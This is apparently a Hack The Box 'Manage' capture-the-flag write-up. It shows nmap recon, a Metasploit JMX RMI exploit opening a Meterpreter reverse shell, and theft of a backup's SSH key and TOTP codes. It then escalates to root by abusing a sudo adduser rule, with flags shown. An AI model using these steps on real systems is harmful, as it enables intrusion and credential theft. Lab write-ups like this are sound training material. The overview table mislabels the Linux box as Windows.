---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - JMX
---
# Overview

| Name        | Manage    |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -T4 10.129.234.57
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-29 20:07 +0545
Nmap scan report for 10.129.234.57 (10.129.234.57)
Host is up (0.29s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)
|_  256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)
2222/tcp open  java-rmi Java RMI
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:42227
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
8080/tcp open  http     Apache Tomcat 10.1.19
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/10.1.19
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.54 seconds
```
# Enumeration
## JMX Exploit 

Port 2222 and 37751 is running a Java RMI service that exposes a jmxrmi endpoint. If authentication is not enabled, which is often the default, this creates a serious misconfiguration in Java Management Extensions (JMX). It allows attackers to interact with the RMI registry remotely and potentially execute code on the system. Tools such as Metasploit, BeanShooter, or BaRMIe can be used to exploit this vulnerability and gain initial access.

```bash
# Step 1: Start Metasploit  
msfconsole  
  
# Step 2: Search for the exploit  
search java_jmx_server  
  
# Step 3: Use the JMX RMI exploit  
use exploit/multi/misc/java_jmx_server  
  
# Step 4: Set the target host  
set RHOST <machine IP>  
  
# Step 5: Set the RMI port  
set RPORT 2222  
  
# Step 6: Set your local IP (replace with your actual tun0 IP)  
set LHOST <your_tun0 IP>  
  
# Step 7: Set the local port to receive the shell  
set LPORT 1337  
  
# Step 8: Launch the exploit  
exploit
```

```bash
msf exploit(multi/misc/java_jmx_server) > set RHOST 10.129.234.57
RHOST => 10.129.234.57
msf exploit(multi/misc/java_jmx_server) > set RPORT 2222
RPORT => 2222
msf exploit(multi/misc/java_jmx_server) > set LHOST 10.10.15.6
LHOST => 10.10.15.6
msf exploit(multi/misc/java_jmx_server) > set LPORT 1337
LPORT => 1337
msf exploit(multi/misc/java_jmx_server) > exploit
[*] Started reverse TCP handler on 10.10.15.6:1337
[*] 10.129.234.57:2222 - Using URL: http://10.10.15.6:8080/Li4lC8jO
[*] 10.129.234.57:2222 - Sending RMI Header...
[*] 10.129.234.57:2222 - Discovering the JMXRMI endpoint...
[+] 10.129.234.57:2222 - JMXRMI endpoint on 127.0.1.1:42227
[*] 10.129.234.57:2222 - Proceeding with handshake...
[+] 10.129.234.57:2222 - Handshake with JMX MBean server on 127.0.1.1:42227
[*] 10.129.234.57:2222 - Loading payload...
[*] 10.129.234.57:2222 - Replied to request for mlet
[*] 10.129.234.57:2222 - Replied to request for payload JAR
[*] 10.129.234.57:2222 - Executing payload...
[*] 10.129.234.57:2222 - Replied to request for payload JAR
[*] 10.129.234.57:2222 - Replied to request for payload JAR
[*] Sending stage (58073 bytes) to 10.129.234.57
[*] Meterpreter session 1 opened (10.10.15.6:1337 -> 10.129.234.57:41528) at 2025-12-29 21:24:01 +0545
[*] 10.129.234.57:2222 - Server stopped.

meterpreter > cd /opt/tomcat
meterpreter > ls
Listing: /opt/tomcat
====================

Mode             Size   Type  Last modified             Name
----             ----   ----  -------------             ----
000667/rw-rw-rw  0      fif   2025-12-29 19:41:01 +054  .bash_history
x                             5
040777/rwxrwxrw  4096   dir   2024-06-21 21:20:08 +054  .local
x                             5
100666/rw-rw-rw  21043  fil   2024-02-15 01:21:50 +054  BUILDING.txt
-                             5
100666/rw-rw-rw  6210   fil   2024-02-15 01:21:50 +054  CONTRIBUTING.md
-                             5
100666/rw-rw-rw  60393  fil   2024-02-15 01:21:50 +054  LICENSE
-                             5
100666/rw-rw-rw  2333   fil   2024-02-15 01:21:50 +054  NOTICE
-                             5
100666/rw-rw-rw  3398   fil   2024-02-15 01:21:50 +054  README.md
-                             5
100666/rw-rw-rw  6776   fil   2024-02-15 01:21:50 +054  RELEASE-NOTES
-                             5
100666/rw-rw-rw  16076  fil   2024-02-15 01:21:50 +054  RUNNING.txt
-                             5
040776/rwxrwxrw  4096   dir   2024-03-01 10:19:47 +054  bin
-                             5
040776/rwxrwxrw  4096   dir   2024-06-21 21:24:56 +054  conf
-                             5
040776/rwxrwxrw  4096   dir   2024-03-01 10:19:46 +054  lib
-                             5
040776/rwxrwxrw  4096   dir   2025-12-29 19:56:49 +054  logs
-                             5
040776/rwxrwxrw  4096   dir   2025-12-29 21:23:34 +054  temp
-                             5
100444/r--r--r-  33     fil   2025-04-14 13:17:58 +054  user.txt
-                             5
040776/rwxrwxrw  4096   dir   2024-03-01 12:43:56 +054  webapps
-                             5
040776/rwxrwxrw  4096   dir   2024-03-01 10:31:49 +054  work
-                             5

meterpreter > cat user.txt
a86d44c7243b65a9171cf7da3e0bc279
```
# Privilege Escalation

```bash
meterpreter > cd /home/useradmin/backups
meterpreter > ls
Listing: /home/useradmin/backups
================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  3088  fil   2024-06-21 22:35:37 +0545  backup.tar.gz

meterpreter > download backup.tar.gz
[*] Downloading: backup.tar.gz -> /mnt/c/Users/At0m/Downloads/lock/website/backup.tar.gz
[*] Downloaded 3.02 KiB of 3.02 KiB (100.0%): backup.tar.gz -> /mnt/c/Users/At0m/Downloads/lock/website/backup.tar.gz
[*] Completed  : backup.tar.gz -> /mnt/c/Users/At0m/Downloads/lock/website/backup.tar.gz
```

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Downloads/lock/website/hey]
└─$ tar -xvzf backup.tar.gz -C /mnt/c/Users/At0m/Downloads/lock/website/hey
./
./.bash_logout
./.profile
./.ssh/
./.ssh/id_ed25519
./.ssh/authorized_keys
./.ssh/id_ed25519.pub
./.bashrc
./.google_authenticator
./.cache/
./.cache/motd.legal-displayed
./.bash_history

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Downloads/lock/website/hey]
└─$ ls
backup.tar.gz

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Downloads/lock/website/hey]
└─$ ls -la
total 12
drwxrwxrwx 1 at0m at0m  512 Jun 21  2024 .
drwxrwxrwx 1 at0m at0m  512 Dec 29 21:27 ..
-rwxrwxrwx 1 at0m at0m 3088 Jun 21  2024 backup.tar.gz
lrwxrwxrwx 1 at0m at0m    9 Jun 21  2024 .bash_history -> /dev/null
-rwxrwxrwx 1 at0m at0m  220 Jun 21  2024 .bash_logout
-rwxrwxrwx 1 at0m at0m 3771 Jun 21  2024 .bashrc
drwxrwxrwx 1 at0m at0m  512 Jun 21  2024 .cache
-r-xr-xr-x 1 at0m at0m  200 Jun 21  2024 .google_authenticator
-rwxrwxrwx 1 at0m at0m  807 Jun 21  2024 .profile
drwxrwxrwx 1 at0m at0m  512 Jun 21  2024 .ssh

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Downloads/lock/website/hey]
└─$ cat .google_authenticator
CLSSSMHYGLENX5HAIFBQ6L35UM
" RATE_LIMIT 3 30 1718988529
" WINDOW_SIZE 3
" DISALLOW_REUSE 57299617
" TOTP_AUTH
99852083
20312647
73235136
92971994
86175591
98991823
54032641
69267218
76839253
56800775
```

Use first code for SSH `99852083`

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Downloads/lock/website/hey]
└─$ cp .ssh/id_ed25519 ~/hey_key

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Downloads/lock/website/hey]
└─$ chmod 600 ~/hey_key

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Downloads/lock/website/hey]
└─$ ssh -i ~/hey_key useradmin@10.129.234.57
(useradmin@10.129.234.57) Verification code:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Dec 29 03:52:11 PM UTC 2025

  System load:           0.08
  Usage of /:            73.8% of 4.34GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             212
  Users logged in:       0
  IPv4 address for eth0: 10.129.234.57
  IPv6 address for eth0: dead:beef::250:56ff:feb0:a332


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

useradmin@manage:~$
```

```bash
useradmin@manage:~$ sudo -l
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
useradmin@manage:~$ sudo adduser admin
Adding user `admin' ...
Adding new group `admin' (1003) ...
Adding new user `admin' (1003) with group `admin' ...
Creating home directory `/home/admin' ...
Copying files from `/etc/skel' ...
New password:
Retype new password:
passwd: password updated successfully
Changing the user information for admin
Enter the new value, or press ENTER for the default
        Full Name []:
        Room Number []:
        Work Phone []:
        Home Phone []:
        Other []:
Is the information correct? [Y/n] y
useradmin@manage:~$ uname -a
Linux manage 5.15.0-142-generic #152-Ubuntu SMP Mon May 19 10:54:31 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
useradmin@manage:~$ su admin
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@manage:/home/useradmin$ sudo su
[sudo] password for admin:
root@manage:/home/useradmin# cat /root/root.txt
b3645b7e6db6d5276ad33f0c75b8dc34
```

---
